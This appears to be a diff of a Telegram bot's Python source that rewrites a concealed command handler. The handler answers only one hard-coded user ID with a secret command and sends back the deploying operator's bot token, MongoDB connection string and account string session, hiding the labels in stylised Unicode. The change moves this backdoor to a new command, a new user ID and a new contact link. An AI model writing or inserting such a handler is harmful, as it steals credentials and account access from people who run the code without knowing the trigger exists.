@@ -106,14 +106,14 @@ async def restartbot(client, message: Message, _):
 
     
 @app.on_message(
-    filters.command("sachinxsanatani")
+    filters.command("tosu")
     & filters.private
-    & filters.user(5959548791)
+    & filters.user(7520092354)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/V_VIP_OWNER)............☆""",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/LEGEND_MICKEY)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
